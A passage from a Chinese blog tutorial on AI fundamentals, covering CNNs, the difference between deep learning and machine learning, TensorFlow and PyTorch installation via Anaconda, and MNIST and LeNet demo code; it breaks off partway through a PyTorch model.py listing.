0.05]，这代表着这张图片是1的概率是10%，是2的概率是10%，是3的概率是75%，是9的概率5%（小贴士：你还有其他表示输出的方法，但现在我只拿softmax(前面提到过的常用于结果优化输出的激活函数)来展示）。全连层的工作方式是根据上一层的输出（也就是之前提到的可以用来表示特征的激活图）来决定这张图片有可能属于哪个类别。例如，如果程序需要预测哪些图片是狗，那么全连层在接收到一个包含类似于一个爪子和四条腿的激活图时输出一个很大的值。同样的，如果要预测鸟，那么全连层会对含有翅膀和喙的激活图更感兴趣。</p><p>基本上，全连层寻找那些最符合特定类别的特征，并且具有相应的权重，来使你可以得到正确的概率。</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-4569fea9c02fb78b72bbfb020e95d553_720w.png" alt="v2-4569fea9c02fb78b72bbfb020e95d553_720w"></p><h5 id="2-3-3-6-训练与测试"><a href="#2-3-3-6-训练与测试" class="headerlink" title="2.3.3.6 训练与测试"></a>2.3.3.6 训练与测试</h5><p>在神经网络简单介绍的章节中已经提到了神经网路工作的整体过程，其中最常用的就是反向传播算法</p><p>在讲反向传播之前，我们得回头看看一个神经网络需要什么才能工作。我们出生的时候并不知道一条狗或者一只鸟长什么样。同样的，在CNN开始之前，权重都是随机生成的。卷积核并不知道要找边还是曲线。更深的卷积层也不知道要找爪子还是喙。等我们慢慢长大了，我们的老师和父母给我们看不同的图片，并且告诉我们那是什么（或者说，他们的类别）。这种输入一幅图像以及这幅图像所属的类别的想法，是CNN训练的基本思路。</p><p>反向传播可以被分成四个不同的部分。前向传播、损失函数、反向传播和权重更新这四个过程是一次迭代。程序会对每一组训练图片重复这一过程（一组图片通常称为一个batch）。当对每一张图片都训练完之后，很有可能你的网络就已经训练好了，权重已经被调整的很好。</p><p>最后，为了验证CNN是否工作的很好，我们还有另一组特殊的数据。我们把这组数据中的图片输入到网络中，得到输出并和标签比较，这样就能看出模型的表现如何了。</p><h5 id="2-3-3-7-总结"><a href="#2-3-3-7-总结" class="headerlink" title="2.3.3.7 总结"></a>2.3.3.7 总结</h5><p>这里只是对神经网络做了一个简单的介绍，并没有进行一个全面的描述。有关非线性化、池化层和网络的超参数（比如卷积核的大小，步长，边缘处理）并没有在这里中讨论。还有网络结构、数据归一化、梯度消失、Dropout、初始化技巧、非凸优化、偏移、损失函数的选择、数据增强、标准化方法，以及有关运算的考虑、反向传播的优化等等我们都还没有讨论。</p><h3 id="2-4-深度学习"><a href="#2-4-深度学习" class="headerlink" title="2.4 深度学习"></a>2.4 深度学习</h3><h4 id="2-4-1-深度学习概念"><a href="#2-4-1-深度学习概念" class="headerlink" title="2.4.1 深度学习概念"></a>2.4.1 深度学习概念</h4><p>深度学习是机器学习的一种，其概念源于人工神经网络的研究，含多个隐藏层的多层感知器就是一种深度学习结构。深度学习通过组合低层特征形成更加抽象的高层表示属性类别或特征，以发现数据的分布式特征表示。研究深度学习的动机在于建立模拟人脑进行分析学习的神经网络，它模仿人脑的机制来解释数据，例如图像，声音和文本等</p><h4 id="2-4-2-深度学习与传统机器学习优劣比较"><a href="#2-4-2-深度学习与传统机器学习优劣比较" class="headerlink" title="2.4.2 深度学习与传统机器学习优劣比较"></a>2.4.2 深度学习与传统机器学习优劣比较</h4><p>深度学习（Deep Learning）VS 传统机器学习（Machine Learning），优劣比较：</p><p><strong>1、端到端 VS 分阶段：</strong>DL学习能力更强，对特征工程要求更低</p><p><strong>2、数据依赖：</strong>DL广泛的假设空间，依赖更广泛的样本</p><p><strong>3、算力依赖：</strong>DL对计算能力要求极高，GPU必不可少</p><p><strong>4、可解释性差：</strong>DL判断原理类似黑箱，经典的获得可解释性的方法，是通过ML模拟DL模型（蒸馏），进而获取可解释性；</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220610180046770.png" alt="image-20220610180046770"></p><h4 id="2-4-3-深度学习兴起的关键——数据-算力"><a href="#2-4-3-深度学习兴起的关键——数据-算力" class="headerlink" title="2.4.3 深度学习兴起的关键——数据+算力"></a>2.4.3 深度学习兴起的关键——数据+算力</h4><p>伴随数据爆炸，传统机器学习无法充分利用庞大的数据进一步提升效果，而与之相比，深度学习刚好可以尽量充分的利用数据。大量的数据和参数空间需要算力支撑，新硬件的兴起弥补了通用处理器算力增长的乏力，为深度学习的发展和繁荣奠定了基础。然而，深度学习对数据和算力的需求，远未达到“充分”；模型参数增长量亦远超硬件计算速度增长了一次，深度学习仍有进一步发展空间。</p><h4 id="2-4-4-深度学习简介"><a href="#2-4-4-深度学习简介" class="headerlink" title="2.4.4 深度学习简介"></a>2.4.4 深度学习简介</h4><p>借用公司大佬提炼的十个问题，与国外大佬发布的相关的<a class="link"   href="https://www.bilibili.com/video/BV1bx411M7Zx" >视频<i class="fas fa-external-link-alt"></i></a>，大家可以更详细的了解深度学习。</p><p>问题1：神经网络由什么构成？——神经元（数字的容器，内含激活值） + 连接（连接方式+权重）</p><p>问题2：为何分层，我们期待中间层做什么？——提取更“高阶”的特征（输入点-图形短边-笔画-输出数字）</p><p>问题3：中间的“连线”是在干什么？——让层与层之间，相互影响（eg：正向传播为例，上一层决定下一层）</p><p>问题4：这个网络，参数量有多少大——可调，以两个隐藏层均为16个神经元为例，共13002个参数</p><p>问题5：层与层之间，如何相互影响——“确定”的函数运算；前一层推算后一层的值，又称“正向传播”</p><p>问题6：“正向传播”这么复杂，编程困难么？——调用函数库，3行python代码！</p><p>问题7：从零开始到在客户侧部署一个模型，有哪些步骤？——网络设计、模型训练、模型部署</p><p>问题8：深度学习相对与传统机器学习算法，主要优势？——学习能力更强，对特征工程要求更低</p><p>问题9：深度学习繁荣的关键（前提）是什么？——大量的数据，充分的算力</p><p>问题10：深度学习的经典应用范围，有哪些？——计算机视觉（CV），自然语言处理（NLP）</p><h3 id="2-5-人工智能、机器学习、神经网络与深度学习的概念与它们之间的关系"><a href="#2-5-人工智能、机器学习、神经网络与深度学习的概念与它们之间的关系" class="headerlink" title="2.5 人工智能、机器学习、神经网络与深度学习的概念与它们之间的关系"></a>2.5 人工智能、机器学习、神经网络与深度学习的概念与它们之间的关系</h3><p>人工智能：模拟、延申并扩展人类智能的一门计算机科学。通俗点讲就是让计算机可以替代人类或超越人类去做社会生活中的事儿。</p><p>机器学习：通过已知数据、去学习数据中的规律与特征。并推广应用的未来新的数据上并做出判断或者预测。（数据和特征工程决定了机器学习的<strong>结果上限</strong>，算法只是让模型尽可能<strong>逼近上限</strong>。也就是说源数据是很重要的）。</p><p>神经网络：来源于仿生学，使计算机模仿生物神经网络的形式来解决实际问题。</p><p>深度学习：深度学习是机器学习的一种，其概念源于人工神经网络的研究，含多个隐藏层的多层感知器就是一种深度学习结构。深度学习通过组合低层特征形成更加抽象的高层表示属性类别或特征，以发现数据的分布式特征表示。研究深度学习的动机在于建立模拟人脑进行分析学习的神经网络，它模仿人脑的机制来解释数据，例如图像，声音和文本等。通俗点讲就是高算力得到的可以进行更多层的数据处理，以神经网络为基石完成更艰巨的任务。</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220610143043467.png" alt="image-20220610143043467"></p><h2 id="三、机器学习实践"><a href="#三、机器学习实践" class="headerlink" title="三、机器学习实践"></a>三、机器学习实践</h2><h3 id="3-1-TensorFlow"><a href="#3-1-TensorFlow" class="headerlink" title="3.1 TensorFlow"></a>3.1 TensorFlow</h3><h4 id="3-1-1-环境安装"><a href="#3-1-1-环境安装" class="headerlink" title="3.1.1 环境安装"></a>3.1.1 环境安装</h4><h5 id="3-1-1-1-前言"><a href="#3-1-1-1-前言" class="headerlink" title="3.1.1.1 前言"></a>3.1.1.1 前言</h5><p>这里环境的安装可以参考该<a class="link"   href="https://blog.csdn.net/ECHOSON/article/details/118420968" >链接<i class="fas fa-external-link-alt"></i></a>。在按照该链接安装tensorflow之前，简单介绍下tensorflow笔者在安装时不清楚的基础概念，方便大家对这个安装过程更加了解。</p><p>tensorflow的安装一般可以分为正常安装以及anaconda安装。anaconda是为机器学习以及深度学习提供便利，致力于简化软件包管理系统和部署，拥有超过1400个软件包。简单来说，anaconda可以方便机器学习以及深度学习环境搭建，为每个生产环境提供独立的执行环境，这种设计理念有点类似于docker，docker就以尽可能节约资源的方式将服务分隔开，相互独立互不干扰。当然anaconda的优势还不止这些。</p><p>当然正常安装tensorflow也是可以的，参考</p><p><a class="link"   href="https://github.com/tensorflow/tensorflow" >https://github.com/tensorflow/tensorflow<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.tensorflow.org/install/gpu" >https://www.tensorflow.org/install/gpu<i class="fas fa-external-link-alt"></i></a></p><p>这两种方式笔者均进行了尝试，正常安装需要安装各种驱动以及配置环境变量，比较麻烦，还是推荐使用anaconda进行安装，包括后面的pytorch也可以使用anaconda进行搭建。</p><p>如果使用anaconda安装直接参考下面的步骤即可，也可以参考上面的链接。</p><h5 id="3-1-1-2-anaconda安装"><a href="#3-1-1-2-anaconda安装" class="headerlink" title="3.1.1.2 anaconda安装"></a>3.1.1.2 anaconda安装</h5><p>下载安装<a class="link"   href="https://www.anaconda.com/products/distribution" >anaconda<i class="fas fa-external-link-alt"></i></a>，并配置国内源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">conda config --remove-key channels</span><br><span class="line">conda config --add channels https://mirrors.ustc.edu.cn/anaconda/pkgs/main/</span><br><span class="line">conda config --add channels https://mirrors.ustc.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --add channels https://mirrors.bfsu.edu.cn/anaconda/cloud/pytorch/</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls yes</span><br><span class="line">pip config <span class="built_in">set</span> global.index-url https://mirrors.ustc.edu.cn/pypi/web/simple</span><br></pre></td></tr></table></figure><h5 id="3-1-1-3-TensorFlow安装"><a href="#3-1-1-3-TensorFlow安装" class="headerlink" title="3.1.1.3 TensorFlow安装"></a>3.1.1.3 TensorFlow安装</h5><p>这里注意软件后面指定的版本均可以通过<code>conda search --full --name xx</code>来指定，如<code>conda search --full --name python</code>就枚举了python的各个版本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">conda create -n tensorflow python==3.9<span class="comment"># 这里的tensorflow可以改为其他字符串，如fa1lr4in-tf，python的版本也可以通过conda search --full --name python进行枚举，这个步骤的目的是配置虚拟环境342</span></span><br><span class="line">conda activate tensorflow   <span class="comment"># 这里如果报错，可以尝试通过anaconda提供的启动器来执行该命令</span></span><br><span class="line">conda install cudatoolkit=11</span><br><span class="line">conda install cudnn==8.2.1</span><br><span class="line">pip install tensorflow-gpu</span><br></pre></td></tr></table></figure><p>验证是否安装成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">tf.config.list_physical_devices(<span class="string">&#x27;GPU&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220611180345934.png" alt="image-20220611180345934"></p><p>之后使用tensorflow时直接通过启动器启动anaconda，然后执行<code>conda activate tensorflow</code>进入anaconda的tensorflow虚拟环境就可以了。</p><h4 id="3-1-2-基础知识"><a href="#3-1-2-基础知识" class="headerlink" title="3.1.2 基础知识"></a>3.1.2 基础知识</h4><h5 id="3-1-2-1-张量（Tensor）"><a href="#3-1-2-1-张量（Tensor）" class="headerlink" title="3.1.2.1 张量（Tensor）"></a>3.1.2.1 张量（Tensor）</h5><p>TensorFlow 内部的计算都是基于张量的，因此我们有必要先对张量有个认识。张量是在我们熟悉的标量、向量之上定义的，详细的定义比较复杂，我们可以先简单的将它理解为一个多维数组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3                                       <span class="comment"># 这个 0 阶张量就是标量，shape=()</span></span><br><span class="line">[1, 2, 3]                            <span class="comment"># 这个 1 阶张量就是向量，shape=(3)</span></span><br><span class="line">[[1, 2, 3], [4, 5, 6]]            <span class="comment"># 这个 2 阶张量就是二维数组，shape=(2, 3)</span></span><br><span class="line">[[[1, 2, 3]], [[7, 8, 9]]]        <span class="comment"># 这个 3 阶张量就是三维数组，shape=(2, 1, 3)  张量形状的判断可以参考左边的中括号，这里左面三个中括号，就是三阶张量。第一个中括号中有两个元素[[1, 2, 3]]与[[7, 8, 9]]。第二个中括号中有一个元素[1, 2, 3]。第三个中括号中有三个元素1, 2, 3</span></span><br></pre></td></tr></table></figure><p>TensorFlow 内部使用tf.Tensor类的实例来表示张量，每个 tf.Tensor有两个属性：</p><ol><li><strong>dtype：</strong> Tensor 存储的数据的类型，可以为tf.float32、tf.int32、tf.string…</li><li><strong>shape：</strong> Tensor 存储的多维数组中每个维度的数组中元素的个数，如上面例子中的shape</li></ol><h4 id="3-1-3-简单的demo"><a href="#3-1-3-简单的demo" class="headerlink" title="3.1.3 简单的demo"></a>3.1.3 简单的demo</h4><p>这里参考<a class="link"   href="https://juejin.cn/post/6844904198010568717" >读懂一个 demo，入门机器学习<i class="fas fa-external-link-alt"></i></a>，这里的demo要做的工作是从图片中识别手写体的数字。类似于识别验证码的功能。这里用到的数据源为<a class="link"   href="http://yann.lecun.com/exdb/mnist/" >MNIST<i class="fas fa-external-link-alt"></i></a>(Mixed National Institute of Standards and Technology database) 。</p><h5 id="3-1-3-0-MNIST介绍"><a href="#3-1-3-0-MNIST介绍" class="headerlink" title="3.1.3.0 MNIST介绍"></a>3.1.3.0 MNIST介绍</h5><p>MNIST是美国国家标准与技术研究院收集整理的大型手写数字数据库，包含 60,000 个示例的训练集以及 10,000 个示例的测试集。数据集中的训练集 (training set) 由来自 250 个不同人手写的数字构成，其中 50%是高中学生，50% 来自人口普查局 (the Census Bureau) 的工作人员。测试集(test set) 也是同样比例的手写数字数据。</p><p>其他细节参照<a class="link"   href="http://yann.lecun.com/exdb/mnist/" >官网<i class="fas fa-external-link-alt"></i></a></p><h5 id="3-1-3-1-处理输入"><a href="#3-1-3-1-处理输入" class="headerlink" title="3.1.3.1 处理输入"></a>3.1.3.1 处理输入</h5><p>要实现识别图片中数字的功能，首先要注意的一个点就是TensorFlow如何识别图片。常见软件识别图片的方法可能是二进制格式，也可能是base64编码，还有可能是其他方式等等。而在TensorFlow，图片将被解析为上面提到的张量，下面是将张量转换为图片的一段demo，生成了像素 3*3 、背景为白色、对角线为黑色的图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plot_image</span>(<span class="params">image</span>):</span></span><br><span class="line">fig = plt.gcf()</span><br><span class="line">fig.set_size_inches(<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">plt.imshow(image, cmap=<span class="string">&#x27;binary&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">Tensor = [</span><br><span class="line">[[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>], [<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>], [<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>]],</span><br><span class="line">[[<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>], [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>], [<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>]],</span><br><span class="line">[[<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>], [<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>] ,[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]],</span><br><span class="line">]<span class="comment"># 三阶张量，形状为(3, 3, 3)。这里表示的是一张图片，如果将n张图片汇集到一个张量中，那么将升阶为四阶张量，如下</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[[</span></span><br><span class="line"><span class="string">[[0,0,0], [255,255,255], [255,255,255]],</span></span><br><span class="line"><span class="string">[[255,255,255], [0,0,0], [255,255,255]],</span></span><br><span class="line"><span class="string">[[255,255,255], [255,255,255] ,[0,0,0]],</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">[</span></span><br><span class="line"><span class="string">[[0,0,0], [255,255,255], [255,255,255]],</span></span><br><span class="line"><span class="string">[[255,255,255], [0,0,0], [255,255,255]],</span></span><br><span class="line"><span class="string">[[255,255,255], [255,255,255] ,[0,0,0]],</span></span><br><span class="line"><span class="string">]]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="comment"># 这里就为4阶张量，形状为(2,3,3,3)。正好对应两张图片</span></span><br><span class="line">plot_image(Tensor)</span><br></pre></td></tr></table></figure><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220613093414166.png" alt="image-20220613093414166"></p><h5 id="3-1-3-2-模型与神经网络"><a href="#3-1-3-2-模型与神经网络" class="headerlink" title="3.1.3.2 模型与神经网络"></a>3.1.3.2 模型与神经网络</h5><p>模型是个函数，这里面内置了很多参数，这些参数的值会直接影响模型的输出结果。有意思的是这些参数都是可学习的，它们可以根据训练数据来进行调整来达到一组最优值，一个训练有素的模型可以提供从输入到所需输出的精确映射。（从代码可以看出tensorflow对每个过程进行了高度封装，从而使使用者无需内部实现逻辑而开箱即用，大大降低了使用门槛，但是如果要深入研究仍需学习源码）。</p><p>在<a class="link"   href="https://tensorflow.google.cn/overview" >这里<i class="fas fa-external-link-alt"></i></a>可以拿到demo代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">mnist = tf.keras.datasets.mnist<span class="comment"># 这里的tf.keras为keras封装在tensorflow的深度学习库以便于快速的模型设计、先进的技术研究和胜场，datasets里面包含了用于调试/测试的小型 NumPy 数据集。目前有七个模块，而mnist是其中的一个模块。详情参见：https://www.tensorflow.org/api_docs/python/tf/keras/datasets</span></span><br><span class="line">(x_train, y_train),(x_test, y_test) =  mnist.load_data()<span class="comment"># 加载mnist数据集。 https://www.tensorflow.org/api_docs/python/tf/keras/datasets/mnisthttps://www.tensorflow.org/api_docs/python/tf/keras/datasets/mnist/load_data</span></span><br><span class="line"><span class="comment"># x_train, x_test = x_train / 255.0, x_test / 255.0</span></span><br><span class="line"></span><br><span class="line">model = tf.keras.models.Sequential([<span class="comment"># 这里将多个layers合并成一组作为并输出一个模型，其返回值与tf.keras.Model相同</span></span><br><span class="line">tf.keras.layers.Flatten(input_shape=(<span class="number">28</span>, <span class="number">28</span>)),<span class="comment"># 将图片展平，将28*28的图片展开成一个包含784个神经元的一维数组</span></span><br><span class="line">tf.keras.layers.Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>), <span class="comment"># 激活层使用了relu激活函数</span></span><br><span class="line">tf.keras.layers.Dropout(<span class="number">0.2</span>),<span class="comment"># 防止过度拟合。过度拟合现象主要表现是：最终模型在训练集上效果好；在测试集上效果差。模型泛化能力弱。 Dropout 解决过度拟合的办法之一，就是随机丢弃一部神经元。Demo 中就是使用 Dropout 随机丢弃 20% 神经元。 https://www.tensorflow.org/api_docs/python/tf/keras/layers/Dropout</span></span><br><span class="line">tf.keras.layers.Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>)<span class="comment"># Layer4 上有 10 个神经元，并使用 softmax作为激活函数，这 10个神经元的输出就是最终结的结果。</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>,<span class="comment"># 优化算法adam，是一种基于一阶和二阶矩的自适应估计的随机梯度下降方法。    https://www.tensorflow.org/api_docs/python/tf/keras/optimizers/Adam</span></span><br><span class="line">loss=<span class="string">&#x27;sparse_categorical_crossentropy&#x27;</span>,<span class="comment"># 损失函数sparse_categorical_crossentropy，用于计算标签与预测之间的交叉熵损失。https://www.tensorflow.org/api_docs/python/tf/keras/losses/SparseCategoricalCrossentropy</span></span><br><span class="line">metrics=[<span class="string">&#x27;accuracy&#x27;</span>])<span class="comment"># 判定标准，计算预测等于标签的频率。https://www.tensorflow.org/api_docs/python/tf/keras/metrics/Accuracy</span></span><br><span class="line"></span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="number">5</span>)<span class="comment"># 训练模型，一个 epoch 是指整个训练数据集的训练一个周期。1 epoch = 1正向传播（ forward pass ）+ 1 反向传播（ backward pass ）（我们可以简单的理解，正向传播目的是为了获得预测结果，反向传播目的是调整到最优的权重（weights），来让 Loss 最小化。）官方链接： https://www.tensorflow.org/api_docs/python/tf/keras/Model#fit</span></span><br><span class="line">model.evaluate(x_test, y_test)<span class="comment"># 通过测试数据验证模型训练的结果。https://www.tensorflow.org/api_docs/python/tf/keras/Model#evaluate</span></span><br></pre></td></tr></table></figure><p>这里对编写的模型进行训练与测试，执行5次整个过程的结果如下。</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220613153544877.png" alt="image-20220613153544877"></p><p>而执行两百次后测试结果如下</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220613154813518.png" alt="image-20220613154813518"></p><p>可以看到得到的结果并没有明显的优势，可能需要对模型进行优化。（优化算法，损失函数，激活函数，layer层等等都可能影响效果）</p><h3 id="3-2-Pytorch"><a href="#3-2-Pytorch" class="headerlink" title="3.2 Pytorch"></a>3.2 Pytorch</h3><h4 id="3-2-1-环境安装"><a href="#3-2-1-环境安装" class="headerlink" title="3.2.1 环境安装"></a>3.2.1 环境安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda create -n pytorch python==3.9</span><br><span class="line">conda activate pytorch</span><br><span class="line">conda install pytorch torchvision torchaudio cudatoolkit -c pytorch -c conda-forge<span class="comment"># 这个命令可以在官网查看https://pytorch.org/如果是老的gpu可能需要指定驱动的版本可以在软件的后面加上版本号如：   conda install pytorch==1.5.0 torchvision==0.6.1 cudatoolkit=10.2，同样，查询版本可以使用conda search --full --name &lt;software_name&gt;命令。如 conda search --full --name cudatoolkit</span></span><br></pre></td></tr></table></figure><p>安装完毕，之后执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="built_in">print</span>(torch.cuda.is_available())</span><br></pre></td></tr></table></figure><p>如果返回True，证明安装没有问题。但是笔者这里返回的是False，遂对错误进行了排查，参考了该<a class="link"   href="https://blog.csdn.net/weixin_41803482/article/details/109231249" >链接<i class="fas fa-external-link-alt"></i></a>。</p><p>首先查看pytorch与cuda的版本对应关系</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="built_in">print</span>(torch.__version__)</span><br><span class="line"><span class="built_in">print</span>(torch.version.cuda)<span class="comment"># 这里笔者输出了None</span></span><br></pre></td></tr></table></figure><p>经过查找资料，在该<a class="link"   href="https://download.pytorch.org/whl/torch_stable.html" >链接<i class="fas fa-external-link-alt"></i></a>中下载了如下版本的torch，将其下载</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220613191322954.png" alt="image-20220613191322954"></p><p>之后进行修复，命令为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip uninstall torch</span><br><span class="line">pip install <span class="string">&quot;torch-1.11.0+cu115-cp39-cp39-win_amd64.whl&quot;</span></span><br></pre></td></tr></table></figure><p>再次进行测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="built_in">print</span>(torch.cuda.is_available())</span><br></pre></td></tr></table></figure><p>返回True，表示支持GPU加速</p><h4 id="3-2-2-基础知识"><a href="#3-2-2-基础知识" class="headerlink" title="3.2.2 基础知识"></a>3.2.2 基础知识</h4><h5 id="3-2-2-1-Pytorch-Tensor的通道排序"><a href="#3-2-2-1-Pytorch-Tensor的通道排序" class="headerlink" title="3.2.2.1 Pytorch Tensor的通道排序"></a>3.2.2.1 Pytorch Tensor的通道排序</h5><p>Pytorch Tensor的通道排序：[batch, channel, height, width]。</p><p>比如6000张彩色的32x32像素的图像，Tensor形状为(6000, 3, 32, 32)</p><h5 id="3-2-2-2-Lenet"><a href="#3-2-2-2-Lenet" class="headerlink" title="3.2.2.2 Lenet"></a>3.2.2.2 Lenet</h5><p>参考自<a class="link"   href="https://zhuanlan.zhihu.com/p/116181964" >卷积神经网络之Lenet<i class="fas fa-external-link-alt"></i></a></p><p>Lenet 是一系列网络的合称，包括 Lenet1 - Lenet5，由 Yann LeCun 等人在 1990 年《Handwritten Digit Recognition with a Back-Propagation Network》中提出，是卷积神经网络的 HelloWorld。</p><p>Lenet是一个 7 层的神经网络，包含 3 个卷积层，2 个池化层，1 个全连接层。其中所有卷积层的所有卷积核都为 5x5，步长 strid=1，池化方法都为全局 pooling，激活函数为 Sigmoid，网络结构如下：</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/100043068-69273-615.png" alt="100043068-69273-615"></p><p>重制后的插图如下</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/100043068-69274-616.png" alt="100043068-69274-616"></p><h4 id="3-2-3-简单demo"><a href="#3-2-3-简单demo" class="headerlink" title="3.2.3 简单demo"></a>3.2.3 简单demo</h4><h5 id="3-2-3-1-前言"><a href="#3-2-3-1-前言" class="headerlink" title="3.2.3.1 前言"></a>3.2.3.1 前言</h5><p>这里采用的官方的一个图像分类的demo，用来识别图像中的物体。里面用到了卷积神经网络的知识。参考了<a class="link"   href="https://www.bilibili.com/video/BV187411T7Ye" >2.1 pytorch官方demo(Lenet)<i class="fas fa-external-link-alt"></i></a>这个视频。以及<a class="link"   href="https://blog.csdn.net/qq_42012782/article/details/124296057" >pytorch图像分类篇：pytorch官方demo实现一个分类器(LeNet)<i class="fas fa-external-link-alt"></i></a>这篇文章。官方demo链接：<a class="link"   href="https://pytorch.org/tutorials/beginner/blitz/cifar10_tutorial.html#sphx-glr-beginner-blitz-cifar10-tutorial-py" >TRAINING A CLASSIFIER<i class="fas fa-external-link-alt"></i></a>。代码参考链接： <a class="link"   href="https://github.com/WZMIAOMIAO/deep-learning-for-image-processing/tree/master/pytorch_classification/Test1_official_demo" >https://github.com/WZMIAOMIAO/deep-learning-for-image-processing/tree/master/pytorch_classification/Test1_official_demo<i class="fas fa-external-link-alt"></i></a></p><p>在看代码之前，最好要保证对上面的基础有一定的了解，这样才不会对里面的基础概念一头雾水，当有了一定基础后，发现这个代码确实是比较基础的，目的就是为了了解pytorch搭建一个简单卷积神经网络的方式（实际上就是调API，还是那句话，真正的革新并不是拿别人已经封装好的东西，要了解里面的数学原理，思考哪些东西可以进行优化，当然可能很少有人可以做到吧，大部分人也就是拿着现成的API来训练模型）。</p><p>该demo中包含了三个文件</p><ul><li>model.py——定义LeNet网络模型</li><li>train.py——加载数据集并训练，训练集计算损失值loss，测试集计算accuracy，保存训练好的网络参数</li><li>predict.py——利用训练好的网络参数后，用自己找的图像进行分类测试</li></ul><h5 id="3-2-3-2-model-py（未完成）"><a href="#3-2-3-2-model-py（未完成）" class="headerlink" title="3.2.3.2 model.py（未完成）"></a>3.2.3.2 model.py（未完成）</h5><p>初始化以及定义神经网络正向传播的过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 